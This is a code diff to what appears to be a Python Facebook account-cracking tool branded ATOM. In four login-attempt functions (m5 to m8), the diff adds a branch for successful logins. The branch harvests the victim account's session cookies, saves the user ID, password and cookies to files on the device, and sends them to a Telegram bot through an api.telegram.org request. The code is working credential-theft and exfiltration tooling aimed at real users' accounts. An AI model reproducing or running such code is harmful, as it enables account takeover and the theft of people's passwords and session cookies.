@@ -959,11 +959,19 @@ def m5(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in cp_xdx:
-                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
-                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
-                        cps.append(uid)
+            elif 'session_key' in q:
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
+                cid = str(q['uid'])
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                        oks.append(cid)
             else:
                 continue
             time.sleep(0.01)
@@ -1041,11 +1049,19 @@ def m6(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in cp_xdx:
-                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
-                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
-                        cps.append(uid)
+            elif 'session_key' in q:
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
+                cid = str(q['uid'])
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                        oks.append(cid)
             else:
                 continue
             time.sleep(0.01)
@@ -1054,6 +1070,7 @@ def m6(ids,pwv):
         time.sleep(7)
     except Exception as e:
         pass
+
 
 
 def m7(ids,pwv):
@@ -1122,11 +1139,19 @@ def m7(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in cp_xdx:
-                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
-                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
-                        cps.append(uid)
+            elif 'session_key' in q:
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
+                cid = str(q['uid'])
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                        oks.append(cid)
             else:
                 continue
             time.sleep(0.01)
@@ -1135,6 +1160,7 @@ def m7(ids,pwv):
         time.sleep(7)
     except Exception as e:
         pass
+
 
 def m8(ids,pwv):
     global loop,oks,cps
@@ -1202,10 +1228,19 @@ def m8(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
-            elif 'www.facebook.com' in q['error']['message']:
-                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
-                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
-                        cps.append(uid)
+            elif 'session_key' in q:
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
+                cid = str(q['uid'])
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                        oks.append(cid)
             else:
                 continue
             time.sleep(0.01)
